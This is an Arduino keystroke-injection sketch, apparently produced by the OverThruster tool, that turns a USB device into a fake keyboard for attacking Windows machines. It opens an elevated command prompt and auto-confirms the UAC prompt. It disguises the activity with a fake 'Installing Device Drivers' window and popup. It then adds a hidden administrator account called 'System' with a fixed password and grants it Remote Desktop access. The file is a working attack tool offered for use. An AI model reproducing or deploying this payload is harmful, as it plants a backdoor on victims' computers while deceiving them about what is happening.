//This Arduino Sketch was generated with the OverThruster tool, located here: https://github.com/RedLectroid/OverThruster

#include <HID-Project.h>
void setup() {
  Keyboard.begin();
  hurryUp();
  killCaps();
  bypassUAC();
  bubblePopup();
  //THIS DELAY IS IMPORTANT, AND MAY NEED TO BE MODIFIED FOR YOUR TARGET
  delay(1000);
  addUser();
  Keyboard.end();
}
void pressEnter(){
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
}
void hurryUp(){
  boolean areWeThereYet = capsCheck();
  while (areWeThereYet == capsCheck()){
    hitCaps();
  }
  hitCaps();
}

boolean capsCheck(){
  if (BootKeyboard.getLeds() & LED_CAPS_LOCK){
    return true;
  }
  else{
    return false;
  }
}

void hitCaps(){
  Keyboard.press(KEY_CAPS_LOCK);
  delay(100);
  Keyboard.release(KEY_CAPS_LOCK);
}

void killCaps(){
  if (capsCheck())
  {
      hitCaps();
  }
}

void bypassUAC(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(100);
  Keyboard.println("powershell Start-Process cmd.exe -Verb runAs");
  delay(100);
  pressEnter();
  delay(1000);

  Keyboard.press(KEY_LEFT_ALT);
  delay(100);
  Keyboard.println("Y");
  Keyboard.release(KEY_LEFT_ALT);
  delay(500);

  Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=15 LINES=1 && title Installing Drivers");
  delay(100);
  pressEnter();
  delay(200);
}
void bubblePopup(){
  Keyboard.println("wlrmdr.exe -s 60000 -f 1 -t \"Installing Device Drivers...\" -m \"Please do not remove the device\"");
  delay(100);
  pressEnter();
  delay(750);
}
void addUser(){
  Keyboard.println("net user System HackedNode /add ");
  pressEnter();
  delay(100);
  Keyboard.println("net localgroup administrators System /add");
  pressEnter();
  Keyboard.println("net localgroup \"remote desktop users\" System /add");
  pressEnter();
  Keyboard.println("exit");
  delay(100);
  pressEnter();
  Keyboard.println("exit");
  delay(100);
  pressEnter();
}
void loop()
{
}
